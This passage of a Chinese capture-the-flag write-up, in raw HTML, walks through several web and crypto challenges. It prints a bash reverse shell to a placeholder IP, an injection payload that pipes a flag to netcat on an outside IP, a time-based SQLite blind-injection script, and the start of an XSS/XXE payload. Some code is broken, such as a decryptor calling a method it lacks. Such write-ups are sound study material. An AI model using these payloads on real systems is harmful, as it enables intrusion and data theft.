class="number">0.02</span>)  <span class="comment"># 防止请求发送过多  </span></span><br><span class="line">    resp = requests.post(url, headers=headers, cookies=cookies, timeout=<span class="number">10</span>, data=&#123;<span class="string">&quot;iIsGod&quot;</span>: payload&#125;)  </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;大胆&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> resp.text  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:  </span><br><span class="line">    shell_payload, will_print = exec_cmd_payload(  </span><br><span class="line">        waf, <span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/2333 0&gt;&amp;1&quot;&#x27;</span>  </span><br><span class="line">    )  </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> will_print:  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;这个payload不会产生回显！&quot;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;shell_payload=&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>连接成功</p><p><img src="https://bu.dusays.com/2024/05/25/6651fccdd4969.png" alt="image-20240524234544979"></p><p>直接读Flag[2]和Flag[1]：</p><p><img src="https://bu.dusays.com/2024/05/25/6651fccd03d13.png" alt="image-20240524234845635"></p><p><img src="https://bu.dusays.com/2024/05/25/6651fccd1a720.png" alt="image-20240524234905985"></p><p>把源码扒下来康康</p><p>太多了 这里就不粘下来了</p><p>可以找到FLAG3的相关代码 应该是它的加密逻辑</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long <span class="keyword">as</span> b2l, long_to_bytes <span class="keyword">as</span> l2b</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line"><span class="keyword">from</span> enum <span class="keyword">import</span> Enum</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Mode</span>(<span class="title class_ inherited__">Enum</span>):</span><br><span class="line">    ECB = <span class="number">0x01</span></span><br><span class="line">    CBC = <span class="number">0x02</span></span><br><span class="line">    CFB = <span class="number">0x03</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Cipher</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, key, iv=<span class="literal">None</span></span>):</span><br><span class="line">        self.BLOCK_SIZE = <span class="number">64</span></span><br><span class="line">        self.KEY = [b2l(key[i:i + self.BLOCK_SIZE // <span class="number">16</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(key), self.BLOCK_SIZE // <span class="number">16</span>)]</span><br><span class="line">        self.DELTA = <span class="number">0x9e3779b9</span></span><br><span class="line">        self.IV = iv</span><br><span class="line">        self.ROUNDS = <span class="number">64</span></span><br><span class="line">        </span><br><span class="line">        self.mode = Mode.CBC <span class="keyword">if</span> iv <span class="keyword">else</span> Mode.ECB</span><br><span class="line">        <span class="keyword">if</span> iv <span class="keyword">and</span> <span class="built_in">len</span>(iv) * <span class="number">8</span> != self.BLOCK_SIZE:</span><br><span class="line">            self.mode = Mode.CFB</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_xor</span>(<span class="params">self, a, b</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(_a ^ _b <span class="keyword">for</span> _a, _b <span class="keyword">in</span> <span class="built_in">zip</span>(a, b))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt_block</span>(<span class="params">self, msg</span>):</span><br><span class="line">        m0, m1 = b2l(msg[:<span class="number">4</span>]), b2l(msg[<span class="number">4</span>:])</span><br><span class="line">        msk = (<span class="number">1</span> &lt;&lt; (self.BLOCK_SIZE // <span class="number">2</span>)) - <span class="number">1</span></span><br><span class="line">        s = <span class="number">0</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(self.ROUNDS):</span><br><span class="line">            s += self.DELTA</span><br><span class="line">            m0 = ((m1 &lt;&lt; <span class="number">4</span>) + self.KEY[_ % <span class="built_in">len</span>(self.KEY)]) ^ (m1 + s) ^ ((m1 &gt;&gt; <span class="number">5</span>) + self.KEY[(_ + <span class="number">1</span>) % <span class="built_in">len</span>(self.KEY)])</span><br><span class="line">            m1 = ((m0 &lt;&lt; <span class="number">4</span>) + self.KEY[(_ + <span class="number">2</span>) % <span class="built_in">len</span>(self.KEY)]) ^ (m0 + s) ^ ((m0 &gt;&gt; <span class="number">5</span>) + self.KEY[(_ + <span class="number">3</span>) % <span class="built_in">len</span>(self.KEY)])</span><br><span class="line">            m0 &amp;= msk</span><br><span class="line">            m1 &amp;= msk</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">return</span> l2b((m0 &lt;&lt; (self.BLOCK_SIZE // <span class="number">2</span>)) | m1)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self, msg</span>):</span><br><span class="line">        msg_padded = pad(msg, self.BLOCK_SIZE // <span class="number">8</span>)</span><br><span class="line">        blocks = [msg_padded[i:i + self.BLOCK_SIZE // <span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(msg_padded), self.BLOCK_SIZE // <span class="number">8</span>)]</span><br><span class="line">        </span><br><span class="line">        ciphertext = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> self.mode == Mode.ECB:</span><br><span class="line">            ciphertext = <span class="string">b&#x27;&#x27;</span>.join(self.encrypt_block(block) <span class="keyword">for</span> block <span class="keyword">in</span> blocks)</span><br><span class="line">        <span class="keyword">elif</span> self.mode == Mode.CBC:</span><br><span class="line">            X = self.IV</span><br><span class="line">            <span class="keyword">for</span> block <span class="keyword">in</span> blocks:</span><br><span class="line">                encrypted_block = self.encrypt_block(self._xor(X, block))</span><br><span class="line">                ciphertext += encrypted_block</span><br><span class="line">                X = encrypted_block</span><br><span class="line">        <span class="keyword">elif</span> self.mode == Mode.CFB:</span><br><span class="line">            X = self.IV</span><br><span class="line">            <span class="keyword">for</span> block <span class="keyword">in</span> blocks:</span><br><span class="line">                output = self.encrypt_block(X)</span><br><span class="line">                encrypted_block = self._xor(output, block)</span><br><span class="line">                ciphertext += encrypted_block</span><br><span class="line">                X = encrypted_block</span><br><span class="line">                </span><br><span class="line">        <span class="keyword">return</span> ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    KEY = get_random_bytes(<span class="number">16</span>)</span><br><span class="line">    IV = get_random_bytes(<span class="number">8</span>)</span><br><span class="line">    cipher = Cipher(KEY, IV)</span><br><span class="line">    FLAG = <span class="string">b&#x27;xxxxxxxxxxxxxxxxxxx&#x27;</span></span><br><span class="line">    ct = cipher.encrypt(FLAG)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;KEY: <span class="subst">&#123;KEY.<span class="built_in">hex</span>()&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;IV: <span class="subst">&#123;IV.<span class="built_in">hex</span>()&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;Ciphertext: <span class="subst">&#123;ct.<span class="built_in">hex</span>()&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>直接让AI解密</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long <span class="keyword">as</span> b2l, long_to_bytes <span class="keyword">as</span> l2b</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line"><span class="keyword">from</span> enum <span class="keyword">import</span> Enum</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Mode</span>(<span class="title class_ inherited__">Enum</span>):</span><br><span class="line">    ECB = <span class="number">0x01</span></span><br><span class="line">    CBC = <span class="number">0x02</span></span><br><span class="line">    CFB = <span class="number">0x03</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Cipher</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, key, iv=<span class="literal">None</span></span>):</span><br><span class="line">        self.BLOCK_SIZE = <span class="number">64</span></span><br><span class="line">        self.KEY = [b2l(key[i:i + self.BLOCK_SIZE // <span class="number">16</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(key), self.BLOCK_SIZE // <span class="number">16</span>)]</span><br><span class="line">        self.DELTA = <span class="number">0x9E3779B9</span></span><br><span class="line">        self.IV = iv</span><br><span class="line">        self.ROUNDS = <span class="number">64</span></span><br><span class="line">        </span><br><span class="line">        self.mode = Mode.CBC <span class="keyword">if</span> iv <span class="keyword">else</span> Mode.ECB</span><br><span class="line">        <span class="keyword">if</span> iv <span class="keyword">and</span> <span class="built_in">len</span>(iv) * <span class="number">8</span> != self.BLOCK_SIZE:</span><br><span class="line">            self.mode = Mode.CFB</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Mode set to CFB due to IV length mismatch.&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Mode: <span class="subst">&#123;self.mode&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_xor</span>(<span class="params">self, a, b</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;Perform XOR operation on two byte sequences.&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(_a ^ _b <span class="keyword">for</span> _a, _b <span class="keyword">in</span> <span class="built_in">zip</span>(a, b))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt_block</span>(<span class="params">self, ct</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;Decrypt a single block.&quot;&quot;&quot;</span></span><br><span class="line">        m0, m1 = b2l(ct[:<span class="number">4</span>]), b2l(ct[<span class="number">4</span>:])</span><br><span class="line">        msk = (<span class="number">1</span> &lt;&lt; (self.BLOCK_SIZE // <span class="number">2</span>)) - <span class="number">1</span></span><br><span class="line">        s = self.DELTA * self.ROUNDS</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.ROUNDS - <span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">            m1 = ((m0 &lt;&lt; <span class="number">4</span>) + self.KEY[(self.ROUNDS - <span class="number">1</span> - i + <span class="number">2</span>) % <span class="built_in">len</span>(self.KEY)]) ^ \</span><br><span class="line">                 (m0 + s) ^ \</span><br><span class="line">                 ((m0 &gt;&gt; <span class="number">5</span>) + self.KEY[(self.ROUNDS - <span class="number">1</span> - i + <span class="number">3</span>) % <span class="built_in">len</span>(self.KEY)])</span><br><span class="line">            m1 &amp;= msk</span><br><span class="line">            m0 = ((m1 &lt;&lt; <span class="number">4</span>) + self.KEY[(self.ROUNDS - <span class="number">1</span> - i) % <span class="built_in">len</span>(self.KEY)]) ^ \</span><br><span class="line">                 (m1 + s) ^ \</span><br><span class="line">                 ((m1 &gt;&gt; <span class="number">5</span>) + self.KEY[(self.ROUNDS - <span class="number">1</span> - i + <span class="number">1</span>) % <span class="built_in">len</span>(self.KEY)])</span><br><span class="line">            m0 &amp;= msk</span><br><span class="line">            s -= self.DELTA</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> l2b((m0 &lt;&lt; (self.BLOCK_SIZE // <span class="number">2</span>)) | m1)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">self, ct</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;Decrypt the ciphertext.&quot;&quot;&quot;</span></span><br><span class="line">        blocks = [ct[i:i + self.BLOCK_SIZE // <span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(ct), self.BLOCK_SIZE // <span class="number">8</span>)]</span><br><span class="line">        msg = <span class="string">b&quot;&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> self.mode == Mode.ECB:</span><br><span class="line">            msg = <span class="string">b&#x27;&#x27;</span>.join(self.decrypt_block(block) <span class="keyword">for</span> block <span class="keyword">in</span> blocks)</span><br><span class="line">        <span class="keyword">elif</span> self.mode == Mode.CBC:</span><br><span class="line">            X = self.IV</span><br><span class="line">            <span class="keyword">for</span> ct_block <span class="keyword">in</span> blocks:</span><br><span class="line">                decrypted_block = self._xor(X, self.decrypt_block(ct_block))</span><br><span class="line">                msg += decrypted_block</span><br><span class="line">                X = ct_block</span><br><span class="line">        <span class="keyword">elif</span> self.mode == Mode.CFB:</span><br><span class="line">            X = self.IV</span><br><span class="line">            <span class="keyword">for</span> ct_block <span class="keyword">in</span> blocks:</span><br><span class="line">                output = self.encrypt_block(X)  <span class="comment"># Assuming encrypt_block exists for CFB mode</span></span><br><span class="line">                decrypted_block = self._xor(output, ct_block)</span><br><span class="line">                msg += decrypted_block</span><br><span class="line">                X = ct_block</span><br><span class="line">                </span><br><span class="line">        <span class="keyword">return</span> unpad(msg, self.BLOCK_SIZE // <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    KEY = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;3362623866656338306539313238353733373566366338383563666264386133&quot;</span>)</span><br><span class="line">    IV = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;64343537373337663034346462393931&quot;</span>)</span><br><span class="line">    cipher = Cipher(KEY, IV)</span><br><span class="line">    ct = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;1cb8db8cabe8edbbddb211f3da4869cdee3bcfb850bce808&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;FLAG: <span class="subst">&#123;cipher.decrypt(ct)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/25/6651fccc63140.png" alt="image-20240525001118426"></p><p>然后把四段flag连起来</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">I&#123;n_zIcCmoSFdoLEoaeoClrai_unIUCaehJST_k&#125;</span><br></pre></td></tr></table></figure><p>栅栏解密</p><p><img src="https://bu.dusays.com/2024/05/25/6651fcccee58b.png" alt="image-20240525001411739"></p><h4 id="这题我出不了了"><a href="#这题我出不了了" class="headerlink" title="这题我出不了了"></a>这题我出不了了</h4><p>进来</p><p><img src="https://bu.dusays.com/2024/05/25/6651fccd6050c.png" alt="image-20240525001948352"></p><p>网上查找资料 发现有类似的2017年的HITCON SQL So Hard(over-rainbow.cn)</p><p>直接跑脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = &quot;union&quot;</span></span><br><span class="line">payload = <span class="string">&quot;&quot;&quot;&#x27;,&#x27;&#x27;)/*%s*/returning(1)as&quot;\\&#x27;/*&quot;,(1)as&quot;\\&#x27;*/-(a=`child_process`)/*&quot;,(2)as&quot;\\&#x27;*/-(b=`/printFlag|nc 121.43.127.41 3333`)/*&quot;,(3)as&quot;\\&#x27;*/-console.log(process.mainModule.require(a).exec(b))]=1//&quot;--&quot;&quot;&quot;</span> % (</span><br><span class="line">            <span class="string">&#x27; &#x27;</span> * <span class="number">1024</span> * <span class="number">1024</span> * <span class="number">16</span>)</span><br><span class="line">username = <span class="built_in">str</span>(randint(<span class="number">1</span>, <span class="number">65535</span>)) + <span class="built_in">str</span>(randint(<span class="number">1</span>, <span class="number">65535</span>)) + <span class="built_in">str</span>(randint(<span class="number">1</span>, <span class="number">65535</span>))</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>: username + payload,</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;AAAAAA&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ok&#x27;</span>)</span><br><span class="line">r = requests.post(<span class="string">&#x27;http://xxxxxx:[port]/register_7D85tmEhhAdgGu92&#x27;</span>, data=data)</span><br><span class="line"><span class="built_in">print</span>(r.content.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure><p>反弹成功</p><p><img src="https://bu.dusays.com/2024/05/25/6651fcce2b84d.png" alt="image-20240525002256811"></p><h4 id="与时俱进"><a href="#与时俱进" class="headerlink" title="与时俱进"></a>与时俱进</h4><p>进来研究一下</p><p>发现是CVE-2022-28346</p><p>F12发现hint</p><p><img src="https://bu.dusays.com/2024/05/25/6651fccd894ba.png" alt="image-20240525002741686"></p><p>是一个注释的nick_name字段 并且提示是aggregate</p><p>测试一下 发现无回显 但是字段会被出来</p><p>可能是时间盲注</p><p>测试一下数据库</p><p>发现django默认使用sqlite作为数据库</p><p>直接跑脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">time_inject</span>(<span class="params">condition</span>):</span><br><span class="line">url = <span class="string">&quot;http://101.200.138.180:8003/inquiry/&quot;</span> headers = &#123;&#125;</span><br><span class="line">cookies = &#123; <span class="string">&quot;csrftoken&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="comment">#自己的</span></span><br><span class="line">          &#125;</span><br><span class="line">data=&#123;csrfmiddlewaretoken<span class="string">&quot;: &quot;</span><span class="string">&quot;,# 填自己的</span></span><br><span class="line"><span class="string">     &quot;</span>sel_value<span class="string">&quot;: &quot;</span>name<span class="string">&quot;, &quot;</span>nick_name<span class="string">&quot;: f&#x27;name&quot;</span>,(<span class="keyword">case</span>  when(&#123;condition&#125;)                                      randomblob(<span class="number">1000000000</span>) <span class="keyword">else</span> <span class="number">0</span> end),<span class="string">&quot;1&#x27;</span></span><br><span class="line"><span class="string">     &#125;</span></span><br><span class="line"><span class="string">while True:</span></span><br><span class="line"><span class="string">    try:</span></span><br><span class="line"><span class="string">        start = time.time()</span></span><br><span class="line"><span class="string">        response = requests.post(url,headers=headers,cookies=cookies,data=data)</span></span><br><span class="line"><span class="string">        end = time.time()</span></span><br><span class="line"><span class="string">        time_cost = end - start</span></span><br><span class="line"><span class="string">        print(&quot;</span>time cost: <span class="string">&quot;, time_cost)</span></span><br><span class="line"><span class="string">        if time_cost &gt; 3:</span></span><br><span class="line"><span class="string">            return True</span></span><br><span class="line"><span class="string">        else:</span></span><br><span class="line"><span class="string">            return False</span></span><br><span class="line"><span class="string">        except:</span></span><br><span class="line"><span class="string">            continue</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def get_length(var_name):</span></span><br><span class="line"><span class="string">    for i in range(1, 1000):</span></span><br><span class="line"><span class="string">        if time_inject(f&quot;</span>length(&#123;var_name&#125;)=&#123;i&#125;<span class="string">&quot;):</span></span><br><span class="line"><span class="string">            return i</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def get_char(var_name, index):</span></span><br><span class="line"><span class="string">    alphabet = string.printable</span></span><br><span class="line"><span class="string">    for c in alphabet:</span></span><br><span class="line"><span class="string">        if time_inject(f&quot;</span>substr(&#123;var_name&#125;,&#123;index&#125;,<span class="number">1</span>)=<span class="string">&#x27;&#123;c&#125;&#x27;</span><span class="string">&quot;):</span></span><br><span class="line"><span class="string">            return c</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">def get_value(var_name, length):</span></span><br><span class="line"><span class="string">    for i in range(1, length + 1):</span></span><br><span class="line"><span class="string">        char = get_char(var_name, i)</span></span><br><span class="line"><span class="string">        if char is None:</span></span><br><span class="line"><span class="string">            result += f&quot;</span>&#123;&#123;&#123;i&#125;&#125;&#125;<span class="string">&quot; else:</span></span><br><span class="line"><span class="string">                result += char</span></span><br><span class="line"><span class="string">                return result</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">def get_tables_name():</span></span><br><span class="line"><span class="string">    payload = &quot;</span>(select group_concat(tbl_name) <span class="keyword">from</span> sqlite_master wheretype=<span class="string">&#x27;table&#x27;</span> <span class="keyword">and</span> tbl_name NOT like <span class="string">&#x27;sqlite_%&#x27;</span>)<span class="string">&quot;</span></span><br><span class="line"><span class="string">    length = get_length(payload)</span></span><br><span class="line"><span class="string">    result = get_value(payload, length)</span></span><br><span class="line"><span class="string">    return result</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def get_schema(table_name):</span></span><br><span class="line"><span class="string">    payload = f&quot;</span>(select group_concat(sql) <span class="keyword">from</span> sqlite_master where <span class="built_in">type</span>=<span class="string">&#x27;table&#x27;</span> <span class="keyword">and</span> name=<span class="string">&#x27;&#123;table_name&#125;&#x27;</span>)<span class="string">&quot;</span></span><br><span class="line"><span class="string">    length = get_length(payload)</span></span><br><span class="line"><span class="string">    result = get_value(payload, length)</span></span><br><span class="line"><span class="string">    return result</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def get_data(table_name, column_name):</span></span><br><span class="line"><span class="string">    payload = f&quot;</span>(select group_concat(&#123;column_name&#125;) <span class="keyword">from</span> &#123;table_name&#125;)<span class="string">&quot;</span></span><br><span class="line"><span class="string">    length = get_length(payload)</span></span><br><span class="line"><span class="string">    result = get_value(payload, length)</span></span><br><span class="line"><span class="string">    return result</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def get_flag():</span></span><br><span class="line"><span class="string">    result = &quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    for i in range(1, 14):</span></span><br><span class="line"><span class="string">        payload = &quot;</span>(select group_concat(flag) <span class="keyword">from</span> flag)<span class="string">&quot;</span></span><br><span class="line"><span class="string">        result += get_char(payload, i)</span></span><br><span class="line"><span class="string">        return result</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">def main():</span></span><br><span class="line"><span class="string">    print(get_flag())</span></span><br><span class="line"><span class="string">    # get_data(&#x27;flag&#x27;, &#x27;flag&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if __name__ == &quot;</span>__main__<span class="string">&quot;:</span></span><br><span class="line"><span class="string">    main()</span></span><br></pre></td></tr></table></figure><p>运行后得到 flag 是 url{i722vrr0}，但是交了不对，访问该地址<code>/i722vrr0</code>，可以下载到了一份源码</p><p>根目录下有公钥、密文文件，查看依赖看见 cryptography&#x3D;&#x3D;3.3.0。</p><p>审计之后，finally&#x2F;views 和 finally&#x2F;functions 存在加密解密逻辑，但是缺少私钥，无法解密，猜测私钥存在服务器上</p><p><img src="https://bu.dusays.com/2024/05/25/6651fccf675ed.png" alt="image-20240525004449079"></p><p><img src="https://bu.dusays.com/2024/05/25/6651fccfb1939.png" alt="image-20240525004507660"></p><p>研究后发现是CVE-2023-50782</p><p>开始做的时候在这里卡死了 研究了好久</p><p>可以去查一下这个CVE</p><p>发现：</p><p>漏洞披露信息显示是 Bleichenbacher timing oracle attack，搜索相关信息，找到一 个 可 用 的 [脚 本](Classic Bleichenbacher RSA Padding Oracle Attack(github.com))</p><p>基于这个脚本 我们稍作修改即可使用</p><p>运行</p><p><img src="https://bu.dusays.com/2024/05/25/6651fccf30f9e.png" alt="image-20240525004851229"></p><h4 id="掉进阿帕奇工资"><a href="#掉进阿帕奇工资" class="headerlink" title="掉进阿帕奇工资"></a>掉进阿帕奇工资</h4><p>进来</p><p><img src="https://bu.dusays.com/2024/05/25/6651fcce8b8f2.png" alt="image-20240525005155621"></p><p>随便测试一下</p><p>随便注册一个 然后登录</p><p> <img src="https://bu.dusays.com/2024/05/25/6651fccdcb75b.png" alt="image-20240525005416630"></p><p>不行 必须是manager 只是员工的不行</p><p>回头看我们的注册的地方</p><p>有一个职级别不能填写</p><p><img src="https://bu.dusays.com/2024/05/25/6651fccc82970.png" alt="image-20240525005550582"></p><p>现在前端看一下 f12</p><p><img src="https://bu.dusays.com/2024/05/25/6651fccd14d1f.png" alt="image-20240525005722146"></p><p>发现job被隐藏了</p><p>抓包手动添加job&#x3D;admin</p><p><img src="https://bu.dusays.com/2024/05/25/6651fcce24c62.png" alt="image-20240525010109434"></p><p>但是还是不行</p><p>注意我们还有一个信息重置没有用 </p><p>选择邮箱重置不行 要选择密保</p><p><img src="https://bu.dusays.com/2024/05/25/6651fcccb1695.png" alt="image-20240525011235183"></p><p>然后登录成功</p><p>发现&#x2F;gongzi_iscc.php</p><p><img src="https://bu.dusays.com/2024/05/25/6651fccd1f427.png" alt="image-20240525011345098"></p><p>随便输下呢 试下ls 11</p><p>返回jb</p><p><img src="https://bu.dusays.com/2024/05/25/6651fccd60d0d.png" alt="image-20240525011432220"></p><p>应该是有xor</p><p>试下jb 11</p><p><img src="https://bu.dusays.com/2024/05/25/6651fccdd1714.png" alt="image-20240525011518395"></p><p>发现执行命令</p><p>我们通过看dockerfile </p><blockquote><p>secret.host:</p><p>image: nginx</p><p>container_name: secret.host</p><p>volumes:</p><p>- .&#x2F;:&#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;</p></blockquote><p>猜测flag在<code>http://secret.host/flag</code></p><p>研究一下发现又是CVE</p><p>CVE-2021-40438</p><p>是一个SSRF的漏洞</p><p><img src="https://bu.dusays.com/2024/05/25/6651fccee7709.png" alt="image-20240525011809524"></p><p>通过php读文件 (payload需要xor)</p><p><code>php -r &quot;echo file_get_contents(&#39;http://secret.host/flag&#39;);&quot;</code></p><p>读到flag</p><h4 id="一道普通的XSS题目"><a href="#一道普通的XSS题目" class="headerlink" title="一道普通的XSS题目"></a>一道普通的XSS题目</h4><p>研究了一下</p><p>发现了一道相似的题</p><p><code>[DiceCTF 2023 writeups (ankursundara.com)](https://blog.ankursundara.com/dicectf23-writeups/)</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const express = require(&#x27;express&#x27;);</span><br><span class="line">const cookieParser = require(&#x27;cookie-parser&#x27;);</span><br><span class="line">const app = express();</span><br><span class="line">app.use(cookieParser());</span><br><span class="line"></span><br><span class="line">app.get(&#x27;/&#x27;, (req, res) =&gt; &#123;</span><br><span class="line">    // free xss, how hard could it be?</span><br><span class="line">    res.end(req.query?.xss ?? &#x27;welcome to impossible-xss&#x27;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(&#x27;/flag&#x27;, (req, res) =&gt; &#123;</span><br><span class="line">    // flag in admin bot&#x27;s FLAG cookie</span><br><span class="line">    res.end(req.cookies?.FLAG ?? &#x27;dice&#123;fakeflag&#125;&#x27;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(8080);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const page = await ctx.newPage();</span><br><span class="line">await page.goto(&#x27;https://impossible-xss.mc.ax&#x27;, &#123; timeout: 3000, waitUntil: &#x27;domcontentloaded&#x27; &#125;);</span><br><span class="line"></span><br><span class="line">// you wish it was that easy</span><br><span class="line">await page.setCookie(&#123;</span><br><span class="line">        &quot;name&quot;: &quot;FLAG&quot;,</span><br><span class="line">        &quot;value&quot;: flag,</span><br><span class="line">        &quot;domain&quot;: &quot;impossible-xss.mc.ax&quot;,</span><br><span class="line">        &quot;path&quot;: &quot;/&quot;,</span><br><span class="line">        &quot;httpOnly&quot;: true,</span><br><span class="line">        &quot;secure&quot;: true,</span><br><span class="line">        &quot;sameSite&quot;: &quot;Strict&quot;</span><br><span class="line">&#125;);</span><br><span class="line">await page.setJavaScriptEnabled(false);</span><br><span class="line"></span><br><span class="line">await page.goto(YOUR_URL, &#123; timeout: 3000, waitUntil: &#x27;domcontentloaded&#x27; &#125;);</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xmls = `&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">   &lt;!ENTITY xxe SYSTEM  &quot;https://impossible-xss.mc.ax/flag&quot; &gt;]&gt;</span><br><span class="line">&lt;xsl:stylesheet xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; version=&quot;1.0&quot;&gt;</span><br><span class="line">  &lt;xsl:template match=&quot;/asdf&quot;&gt;</span><br><span class="line">    &lt;HTML&gt;</span><br><span class="line">      &lt;HEAD&gt;</span><br><span class="line">        &lt;TITLE&gt;&lt;/TITLE&gt;</span><br><span class="line">      &lt;/HEAD&gt;</span><br><span class="line">      &lt;BODY&gt;</span><br><span class="line">        &lt;img&gt;</span><br><span class="line">          